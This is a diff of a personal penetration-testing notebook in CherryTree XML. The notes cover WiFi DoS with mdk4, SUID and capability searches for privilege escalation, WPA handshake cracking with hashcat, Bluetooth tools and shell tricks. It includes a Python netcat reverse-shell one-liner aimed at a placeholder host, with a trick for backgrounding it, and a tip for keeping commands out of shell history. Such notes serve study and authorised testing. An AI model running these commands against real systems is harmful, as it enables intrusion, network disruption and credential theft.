+        <rich_text foreground="#8f8ff0f0a4a4"> -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")'</rich_text>
         <rich_text>
 
 </rich_text>
-        <rich_text weight="heavy">Trick:</rich_text>
+        <rich_text scale="h2" weight="heavy">Trick</rich_text>
+        <rich_text>(run in background)</rich_text>
+        <rich_text scale="h2" weight="heavy">:</rich_text>
         <rich_text>
 </rich_text>
-        <rich_text foreground="#3333d1d17a7a">$ (python3 -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")' &amp;)</rich_text>
+        <rich_text foreground="#2626a2a26969">$ </rich_text>
+        <rich_text foreground="#f6f661615151">(</rich_text>
+        <rich_text foreground="#2626a2a26969">python3</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -c 'import os; os.system("nc &lt;ip&gt; &lt;port&gt; -e /bin/sh")' </rich_text>
+        <rich_text foreground="#f6f661615151">&amp;)</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2" weight="heavy">Setup a simple http server</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text foreground="#2626a2a26969">$ python3</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -m http.server &lt;port&gt;</rich_text>
       </node>
     </node>
-    <node name="WiFi DoS Attack" unique_id="378" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="177" is_bold="0" foreground="" ts_creation="1728489373" ts_lastsave="1729191362">
-      <rich_text underline="single" scale="h1" weight="heavy">DoS ATTACK</rich_text>
+    <node name="WiFi DoS Attack" unique_id="378" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="177" is_bold="0" foreground="" ts_creation="1728489373" ts_lastsave="1730278569">
+      <rich_text underline="single" scale="h1" weight="heavy">WiFi DoS ATTACK</rich_text>
       <rich_text> (source:</rich_text>
       <rich_text link="webs https://amartyanambiar.github.io/mynotes/wireless/WIRELESS_NETWORK--Wi-Fi_HACKING--DoS_ATTACK.html">https://amartyanambiar.github.io/mynotes/wireless/WIRELESS_NETWORK--Wi-Fi_HACKING--DoS_ATTACK.html</rich_text>
       <rich_text>)
@@ -9328,7 +9986,8 @@ g   - WPA Downgrade test
  </rich_text>
         </node>
       </node>
-      <node name="mdk4" unique_id="383" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728496003" ts_lastsave="1728501010">
+      <node name="mdk4" unique_id="383" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728496003" ts_lastsave="1730251062">
+        <rich_text scale="h3" weight="heavy">see mdk3 for more info</rich_text>
         <node name="--help" unique_id="384" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728501007" ts_lastsave="1728501013">
           <rich_text foreground="#18b2b2">mdk4</rich_text>
           <rich_text> </rich_text>
@@ -9420,8 +10079,11 @@ ATTACK MODE x: Proof-of-concept of WiFi protocol implementation vulnerability te
         </node>
       </node>
     </node>
-    <node name="Bluetooth" unique_id="307" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="158" is_bold="0" foreground="" ts_creation="1718601441" ts_lastsave="1728276167">
-      <rich_text># bdaddr
+    <node name="Bluetooth" unique_id="307" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="158" is_bold="0" foreground="" ts_creation="1718601441" ts_lastsave="1730278553">
+      <rich_text scale="h1" weight="heavy">Bluetooth</rich_text>
+      <rich_text>
+
+# bdaddr
 sudo bdaddr -i hci0 XX:XX:XX:XX:XX:XX
 
 # Connect and interact with Bluetooth devices using Bluetoothctl
@@ -9571,23 +10233,29 @@ script didn't find any problems.
         <rich_text>
 </rich_text>
       </node>
-      <node name="searching" unique_id="396" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729098853" ts_lastsave="1729831693">
+      <node name="searching" unique_id="396" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729098853" ts_lastsave="1730277571">
         <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">find:</rich_text>
         <rich_text>
-find / -perm -4000 -type f 2&gt;/dev/null
+</rich_text>
+        <rich_text family="monospace">find / -perm -4000 -type f 2&gt;/dev/null
 find / "passwd" 2&gt;/dev/null | grep "passwd"
-find /etc "passwd" 2&gt;/dev/null | grep "passwd"
+find /etc "passwd" 2&gt;/dev/null | grep "passwd"</rich_text>
+        <rich_text>
+
 
 </rich_text>
         <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">getcap:</rich_text>
         <rich_text>
-getcap -r / 2&gt;/dev/null
+</rich_text>
+        <rich_text family="monospace">getcap -r / 2&gt;/dev/null</rich_text>
+        <rich_text>
+
 
 </rich_text>
         <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">Hint:</rich_text>
         <rich_text>
-</rich_text>
-        <rich_text weight="heavy">2&gt; /dev/null</rich_text>
+the command </rich_text>
+        <rich_text underline="single" weight="heavy">2&gt;/dev/null</rich_text>
         <rich_text> means that, </rich_text>
         <rich_text style="italic" weight="heavy">redirect</rich_text>
         <rich_text> the </rich_text>
@@ -9596,7 +10264,29 @@ getcap -r / 2&gt;/dev/null
         <rich_text style="italic" weight="heavy">/dev/null</rich_text>
         <rich_text>. </rich_text>
         <rich_text foreground="#c0c0bfbfbcbc">Essentially meaning, just get rid of the error messages</rich_text>
-        <rich_text>.</rich_text>
+        <rich_text>.
+
+
+</rich_text>
+        <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">Find files based on user permission:</rich_text>
+        <rich_text>
+# searching for user 'root' files
+</rich_text>
+        <rich_text family="monospace">find /path -user root
+</rich_text>
+        <rich_text># searching for user 'root' files With Permission to rwx (r:read, w:write, x:execute)</rich_text>
+        <rich_text family="monospace">
+find /path -user root -perm -u+r
+find /path -user root -perm -u+rw</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">find /path -user root -perm -u+rwx</rich_text>
+        <rich_text>
+# filter for .sh files
+</rich_text>
+        <rich_text family="monospace">find /path -user root -perm -u+rwx 2&gt;/dev/null | grep '\.sh'</rich_text>
+        <rich_text>
+</rich_text>
       </node>
     </node>
   </node>
@@ -9652,8 +10342,9 @@ getcap -r / 2&gt;/dev/null
 	☐ bash (1)             - GNU Bourne-Again SHell
 </rich_text>
     </node>
-    <node name="Find Applications" unique_id="293" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1718588651" ts_lastsave="1729191453">
-      <rich_text>☐ Application Finder
+    <node name="Find Applications" unique_id="293" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1718588651" ts_lastsave="1730278286">
+      <rich_text scale="h1" weight="heavy">Application Finder</rich_text>
+      <rich_text>
 
 command:	xfce4-appfinder --collapsed
 shortcut:		</rich_text>
@@ -9668,9 +10359,10 @@ shortcut:		</rich_text>
 # proxychains firefox
 # proxychains qterminal/gnome-terminal</rich_text>
     </node>
-    <node name="Handshake/EAPOL" unique_id="312" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="146" is_bold="0" foreground="" ts_creation="1723906001" ts_lastsave="1729191851">
-      <rich_text># How to recover hash from a handshake file (.cap)
-# Extract EAPOL from (airodump-ng) .cap file
+    <node name="Handshake/EAPOL" unique_id="312" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="146" is_bold="0" foreground="" ts_creation="1723906001" ts_lastsave="1730278516">
+      <rich_text scale="h3" weight="heavy"># How to recover hash from a handshake file (.cap)
+# Extract EAPOL from (airodump-ng) .cap file</rich_text>
+      <rich_text>
 
 [SOURCE] </rich_text>
       <rich_text link="webs https://hashcat.net/forum/thread-11853.html">https://hashcat.net/forum/thread-11853.html</rich_text>
@@ -9679,19 +10371,23 @@ shortcut:		</rich_text>
       <rich_text link="webs https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2</rich_text>
       <rich_text>
 </rich_text>
-      <node name=".cap to .hc22000" unique_id="311" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723905989" ts_lastsave="1724179294">
-        <rich_text># convert cap to hc22000
+      <node name=".cap to .hc22000" unique_id="311" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723905989" ts_lastsave="1730278503">
+        <rich_text scale="h3" weight="heavy"># convert cap to hc22000</rich_text>
+        <rich_text>
 </rich_text>
         <rich_text family="monospace">$ hcxpcapngtool -o induction.hc22000 wpa-Induction.pcap</rich_text>
         <rich_text>
 
-# recover with hashcat
+</rich_text>
+        <rich_text scale="h3" weight="heavy"># recover with hashcat</rich_text>
+        <rich_text>
 </rich_text>
         <rich_text family="monospace">$ hashcat -m 22000 induction.hc22000 -a 3 Induction</rich_text>
       </node>
     </node>
-    <node name="Open a terminal page" unique_id="291" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718587641" ts_lastsave="1729191475">
-      <rich_text>☐ Short Cut:
+    <node name="Open a terminal page" unique_id="291" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718587641" ts_lastsave="1730278488">
+      <rich_text scale="h1" weight="heavy">Short Cut:</rich_text>
+      <rich_text>
 
 </rich_text>
       <rich_text background="#2626a2a26969">alt</rich_text>
@@ -9702,43 +10398,87 @@ shortcut:		</rich_text>
       <rich_text>
 
 
+</rich_text>
+      <rich_text scale="h3" weight="heavy">☐ Commands</rich_text>
+      <rich_text>
 
-☐ Commands
-
-gnome-terminal
+</rich_text>
+      <rich_text family="monospace">gnome-terminal
 qterminal
 exo-open --launch TerminalEmulator</rich_text>
     </node>
-    <node name="Survive terminal close" unique_id="294" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718589683" ts_lastsave="1729191800">
-      <rich_text># 1
-$ nohup
+    <node name="Survive terminal close" unique_id="294" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718589683" ts_lastsave="1730278326">
+      <rich_text scale="h1" weight="heavy">Survive terminal close / Run command in bakground</rich_text>
+      <rich_text>
 
-# 2
-$ disown
+</rich_text>
+      <rich_text scale="h3" weight="heavy"># 1</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text foreground="#8f8ff0f0a4a4">$ nohup</rich_text>
+      <rich_text>
 
-# 3
-$ (applicationName &amp;)
+</rich_text>
+      <rich_text scale="h3" weight="heavy"># 2</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text foreground="#8f8ff0f0a4a4">$ disown</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h3" weight="heavy"># 3</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text foreground="#8f8ff0f0a4a4">$ (applicationName &amp;)</rich_text>
+      <rich_text>
 </rich_text>
       <rich_text foreground="#777776767b7b">example: linux@linux-desktop:~$ (chromium-browser &amp;)</rich_text>
       <rich_text>
 </rich_text>
     </node>
-    <node name="Dont save commands" unique_id="351" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1724982155" ts_lastsave="1729191804">
-      <rich_text scale="h3" weight="heavy"># Use a space ‘</rich_text>
-      <rich_text scale="h3" background="#9999c1c1f1f1" weight="heavy"> </rich_text>
-      <rich_text scale="h3" weight="heavy">’ in start</rich_text>
+    <node name="Dont save commands" unique_id="351" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1724982155" ts_lastsave="1730277989">
+      <rich_text scale="h1" weight="heavy">Dont save commands</rich_text>
       <rich_text>
-$ip a
+
+• Use a space ‘</rich_text>
+      <rich_text background="#9999c1c1f1f1"> </rich_text>
+      <rich_text>’ in the start
+
+Example
+$ip a		</rich_text>
+      <rich_text foreground="#f9f9f0f06b6b"># Command will be save</rich_text>
+      <rich_text>
 $</rich_text>
       <rich_text background="#9999c1c1f1f1"> </rich_text>
-      <rich_text>ip a
+      <rich_text>ip a		</rich_text>
+      <rich_text foreground="#5757e3e38989"># Command will not be save</rich_text>
+      <rich_text>
 </rich_text>
     </node>
-    <node name="Kill a User" unique_id="364" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="42" is_bold="0" foreground="" ts_creation="1727983301" ts_lastsave="1729191485">
+    <node name="Kill a User" unique_id="364" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="42" is_bold="0" foreground="" ts_creation="1727983301" ts_lastsave="1730278259">
+      <rich_text scale="h1" weight="heavy">Kill a User</rich_text>
+      <rich_text>
+
+Find an Active USER (You can see USER activities with command '</rich_text>
+      <rich_text family="monospace">ps</rich_text>
+      <rich_text>')
+</rich_text>
+      <rich_text family="monospace">users
+w
+who
+</rich_text>
+      <rich_text>
+Kill the USER
+</rich_text>
       <rich_text family="monospace">pkill -KILL -u yourusername</rich_text>
+      <rich_text>
+</rich_text>
     </node>
-    <node name="Kali WindowsManager" unique_id="365" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="165" is_bold="0" foreground="" ts_creation="1727983359" ts_lastsave="1729191508">
-      <rich_text>Window Manager:
+    <node name="Kali WindowsManager" unique_id="365" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="165" is_bold="0" foreground="" ts_creation="1727983359" ts_lastsave="1730278362">
+      <rich_text scale="h1" weight="heavy">Kali WindowsManager</rich_text>
+      <rich_text>
+
+Window Manager:
 </rich_text>
       <rich_text family="monospace">xfwm4
 xfwm4 --replace</rich_text>
@@ -9758,9 +10498,10 @@ lightdm:
 </rich_text>
       <rich_text family="monospace">service lightdm restart</rich_text>
     </node>
-    <node name="Realtek Drivers" unique_id="368" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="167" is_bold="0" foreground="" ts_creation="1728072865" ts_lastsave="1729194433">
-      <rich_text scale="h1">Realtek RTL8188FTV WiFi Adapter on Linux</rich_text>
+    <node name="Realtek Drivers" unique_id="368" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="167" is_bold="0" foreground="" ts_creation="1728072865" ts_lastsave="1730278356">
+      <rich_text scale="h1" weight="heavy">Realtek RTL8188FTV WiFi Adapter on Linux</rich_text>
       <rich_text>
+
 FORM	:	</rich_text>
       <rich_text link="webs https://forums.debian.net/viewtopic.php?t=155331">https://forums.debian.net/viewtopic.php?t=155331</rich_text>
       <rich_text>
@@ -9860,8 +10601,11 @@ Other ways:
 sudo apt install --reinstall [PACKAGE]</rich_text>
       </node>
     </node>
-    <node name="ETag vuln" unique_id="369" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1728089310" ts_lastsave="1729191713">
-      <rich_text>ETags have had a bit of a bad rap in the past as they have been used  to enable cookie-less tracking, where the server sends unique ETag for  one resource for each source IP address. See </rich_text>
+    <node name="ETag vuln" unique_id="369" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1728089310" ts_lastsave="1730278419">
+      <rich_text scale="h1" weight="heavy">What is ETag?</rich_text>
+      <rich_text>
+
+ETags have had a bit of a bad rap in the past as they have been used  to enable cookie-less tracking, where the server sends unique ETag for  one resource for each source IP address. See </rich_text>
       <rich_text link="webs http://www.arctic.org/~dean/tracking-without-cookies.html">tracking without cookies</rich_text>
       <rich_text> for more information.
 
@@ -9896,8 +10640,9 @@ The </rich_text>
       <rich_text weight="heavy">could</rich_text>
       <rich_text> cause a security vulnerability.</rich_text>
     </node>
-    <node name="Hash" unique_id="398" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1729187327" ts_lastsave="1729194533">
-      <rich_text>Hash/Hashing
+    <node name="Hash" unique_id="398" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1729187327" ts_lastsave="1730278446">
+      <rich_text scale="h1" weight="heavy">Hash/Hashing</rich_text>
+      <rich_text>
 
 In computer science, a hash is a value generated from a string of text or data using a specific algorithm, known as a hash function. The purpose of a hash function is to transform input data (of any size) into a fixed-size output, usually a short and unique code. This output, called a hash value or digest, is used for tasks like data comparison, verification, or efficient data retrieval.
 
